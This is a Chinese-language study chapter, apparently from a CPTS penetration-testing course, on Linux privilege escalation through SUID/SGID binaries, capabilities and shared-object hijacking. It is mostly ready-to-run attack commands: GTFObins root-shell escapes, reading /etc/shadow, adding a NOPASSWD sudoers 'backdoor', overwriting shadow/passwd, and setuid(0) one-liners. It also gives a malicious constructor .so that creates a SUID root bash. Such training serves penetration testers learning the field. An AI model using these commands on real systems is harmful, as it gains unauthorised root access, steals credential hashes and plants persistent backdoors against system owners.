# 第 91 章 - SUID、SGID 與 Capabilities

## 標籤

- #cpts
- #chapter
- #linux
- #suid
- #capabilities
- #priv-esc

## 學習目標

- 能找出系統中非標準的 SUID binary 並判斷可利用性。
- 知道常見 GTFObins SUID escape 方法。
- 能找出有危險 capabilities 的 binary 並利用。
- 理解 shared object 注入（SUID binary 缺少的 .so）。

---

## 理論基礎

| 類型 | 作用 | 提權條件 |
|------|------|---------|
| SUID | 以檔案擁有者（通常 root）的 UID 執行 | binary 有 shell/exec 能力 |
| SGID | 以檔案群組身份執行 | binary 有檔案讀寫能力 |
| cap_setuid | 程式可設定任意 UID | 程式有 setuid() 呼叫 |
| cap_dac_read_search | 繞過讀取 ACL | 程式能讀取任意檔案 |
| cap_dac_override | 繞過所有 ACL | 程式能讀/寫任意檔案 |

---

## 步驟一：枚舉 SUID / SGID

```bash
# 找所有 SUID binary
find / -perm -4000 -type f 2>/dev/null
# -perm -4000 → 設有 SUID bit 的檔案（4 代表 SUID）
# -type f     → 只找一般檔案（排除目錄）
# 2>/dev/null → 丟棄 "Permission denied" 錯誤

# 找所有 SGID binary
find / -perm -2000 -type f 2>/dev/null
# -perm -2000 → SGID bit（2 代表 SGID）

# 同時找 SUID 和 SGID
find / -perm /6000 -type f 2>/dev/null
# /6000 → 4000(SUID) OR 2000(SGID)

# 輸出範例分析：
# /usr/bin/passwd    → 正常（設定密碼需要）
# /usr/bin/sudo      → 正常
# /usr/bin/find      → 非標準！可利用
# /usr/local/bin/backup_tool → 自製工具，重點分析

# 過濾掉常見正常的 SUID binary，剩下的才分析
find / -perm -4000 -type f 2>/dev/null | grep -v -E \
  "passwd|shadow|ping|mount|umount|su$|sudo|fusermount|pkexec|newgrp|chfn|chsh|gpasswd"
# grep -v -E → 反向過濾（排除這些常見正常程式）
```

---

## 方法一：GTFObins SUID Escape

常見工具的 SUID 利用（參考 gtfobins.github.io → SUID 分類）：

```bash
# ─── bash（有 SUID 就直接）───
/bin/bash -p
# -p → privileged mode，保留 SUID 設定的 effective UID（root）
# 不加 -p 的話 bash 會 drop 到 real UID

# ─── find ───
find . -exec /bin/bash -p \;
# -exec COMMAND \; → 對找到的每個結果執行 COMMAND
# /bin/bash -p → 以 root effective UID 啟動 bash

# ─── python / python3 ───
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# os.execl → 替換當前程序（保留 SUID）
# -p → privileged mode

# ─── perl ───
perl -e 'exec "/bin/bash -p"'

# ─── vim ───
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
# -c → 執行 vim ex 命令
# :py3 → 在 vim 中執行 Python 3

# ─── cp ───
# 複製 /etc/shadow 讀 hash
LFILE=/etc/shadow
cp "$LFILE" /tmp/shadow_copy
# 現在以 root 身份複製了 shadow，直接讀
cat /tmp/shadow_copy

# ─── nano ───
# 以 SUID root 開啟 /etc/sudoers
nano /etc/sudoers
# 加入：user ALL=(ALL) NOPASSWD:ALL

# ─── nmap（舊版 < 5.21）───
nmap --interactive
# 互動模式輸入 !sh

# ─── env ───
env /bin/bash -p
# env → 執行程式（繼承環境），以 SUID 身份執行 bash

# ─── tee ───
echo 'user ALL=(ALL) NOPASSWD:ALL' | LFILE=/etc/sudoers.d/backdoor tee "$LFILE"
# tee 以 root 身份寫入受保護的檔案

# ─── dd ───
LFILE=/etc/shadow
dd if=/dev/stdin of=$LFILE
# if=stdin → 從標準輸入讀取
# of=$LFILE → 寫入 shadow（覆蓋）
# 可覆蓋 /etc/passwd 或 /etc/sudoers

# ─── xxd ───
LFILE=/etc/shadow
xxd "$LFILE" | xxd -r
# xxd → hex dump，SUID 讀取任意檔案並輸出

# ─── awk ───
LFILE=/etc/shadow
awk '//' "$LFILE"
# // → 匹配所有行（讀取並輸出整個檔案）
```

---

## 方法二：Capabilities 利用

```bash
# 找所有有 capabilities 的 binary
getcap -r / 2>/dev/null
# getcap → 取得 capability
# -r     → 遞迴搜尋整個檔案系統

# 輸出範例：
# /usr/bin/python3.8 = cap_setuid,cap_setgid+eip
# /usr/bin/perl = cap_setuid+eip
# /usr/bin/ping = cap_net_raw+p
# /usr/sbin/tcpdump = cap_net_raw+ep

# capability 後綴說明：
# +e  → effective（立即生效）
# +i  → inheritable（可被 exec 繼承）
# +p  → permitted（允許的能力集）

# ─── cap_setuid（Python）───
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# os.setuid(0) → 設定 effective UID 為 root（0）
# 前提：/usr/bin/python3 有 cap_setuid

# ─── cap_setuid（Perl）───
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
# POSIX::setuid(0) → 設定 UID 為 0

# ─── cap_setuid（Ruby）───
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# ─── cap_dac_read_search（讀任意檔案）───
# 若 python3 有此 cap，可讀 /etc/shadow：
python3 -c 'print(open("/etc/shadow").read())'

# 用 tar 讀取（若 tar 有此 cap）
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='cat /etc/shadow > /tmp/shadow'

# ─── cap_sys_admin（幾乎等同 root）───
# 可以 mount 任意檔案系統
# 可修改 namespace
# 利用方式複雜，依具體服務決定
```

---

## 方法三：Shared Object Hijacking（SUID binary 找不到 .so）

```bash
# 原理：SUID binary 在執行時若找不到某個 .so，
# 會按照 RPATH → LD_LIBRARY_PATH → 系統路徑搜尋
# 若搜尋路徑可寫 → 放惡意 .so → 以 root 執行

# Step 1：用 strace 找 SUID binary 找不到的 .so
strace /path/to/suid_binary 2>&1 | grep "No such file"
# strace → 追蹤系統呼叫
# 2>&1   → 把 stderr 合併到 stdout
# grep "No such file" → 找找不到的檔案

# 或用 ldd 看 binary 的相依性
ldd /path/to/suid_binary
# 找 "not found" 或 "=> ()" 的 .so

# Step 2：找 RPATH（binary 優先搜尋的路徑）
readelf -d /path/to/suid_binary | grep -E "(RPATH|RUNPATH)"
# readelf -d → 讀取 ELF 動態區段
# RPATH/RUNPATH → binary 指定的 .so 搜尋路徑

objdump -x /path/to/suid_binary | grep RPATH
# 另一種方式

# Step 3：若 RPATH 指向可寫目錄，建立惡意 .so
cat > /writable/path/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
}
EOF
# __attribute__((constructor)) → 讓函式在 library 載入時自動執行

gcc -shared -fPIC -o /writable/path/missing.so /writable/path/evil.c
# -shared → 編譯成共享函式庫
# -fPIC   → Position-Independent Code
# -o      → 輸出檔案名（要配對 binary 找的 .so 名稱）

# Step 4：執行 SUID binary 觸發載入
/path/to/suid_binary
# 載入我們的 .so → 執行 inject() → 建立 SUID bash

# Step 5：取得 root shell
/tmp/rootbash -p
# -p → 保留 SUID effective UID（root）
```

---

## 判斷邏輯

```
find / -perm -4000 找到非標準 binary？

└── 在 GTFObins 搜尋（SUID 分類）
    ├── 有 shell/exec 能力 → 直接利用
    └── 有檔案讀寫能力 → 讀 shadow / 寫 sudoers

getcap -r 找到有 capability 的 binary？

└── cap_setuid → python/perl 呼叫 setuid(0) → bash
    cap_dac_read_search → 讀 /etc/shadow → 破解
    cap_dac_override → 寫 /etc/sudoers → sudo -s

SUID binary 存在但 GTFObins 找不到？

└── strace 看缺失的 .so
    └── RPATH 可寫 → shared object hijacking
```

---

## 速查表

```bash
# SUID
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# bash SUID（若 /bin/bash 有 SUID）
/bin/bash -p

# find SUID escape
find . -exec /bin/bash -p \;

# python3 cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 找 .so 依賴問題
strace /suid_binary 2>&1 | grep "No such file"
ldd /suid_binary | grep "not found"
```

---

## 關聯筆記

- [[88-Linux安全模型|第 88 章 - Linux 安全模型]]
- [[89-本機列舉|第 89 章 - 本機列舉]]
- [[90-Sudo|第 90 章 - Sudo]]
- [[11-Volume-11-Linux-Privilege-Escalation-Index|Vol.11 - Linux PrivEsc]]
